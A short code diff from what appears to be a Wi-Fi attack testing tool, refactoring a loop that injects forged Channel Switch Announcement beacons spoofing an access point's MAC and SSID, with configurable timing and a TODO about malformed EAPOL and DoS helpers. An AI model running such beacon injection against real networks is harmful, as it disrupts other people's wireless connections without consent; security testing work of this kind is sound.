@@ -51,13 +51,12 @@ void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, c
 					const string &ssid, const Channel &ap_channel, const Channel &new_channel, const int ms_interval,
 					const int attack_time
 ){
-	const NetworkInterface iface(iface_name);
+	//TODO change to  helper for Bl0ck/malformed eapol/CSA, Dos_HARd?
+	PacketSender sender{iface_name};
 	const auto end_time = steady_clock::now() + seconds(attack_time);
-
-	PacketSender sender;
 	while(steady_clock::now() < end_time && !g_interrupted.load()){
 		RadioTap csa_rt = get_CSA_beacon(ap_mac, ssid, ap_channel, new_channel);
-		sender.send(csa_rt, iface);
+		sender.send(csa_rt);
 		this_thread::sleep_for(milliseconds(ms_interval));
 	}
 
@@ -88,12 +87,12 @@ void run_chs_attack(RunStatus &rs){
 
 	rs.start_observers();
 
-	interruptible_sleep(seconds(10));
+	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
 	if(g_interrupted.load()) return;
 	log(LogLevel::INFO, "Attack START");
 	check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time);
 	log(LogLevel::INFO, "Attack END");
-	interruptible_sleep(seconds(10));
+	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
 
 	rs.process_manager.stop_all();
 }
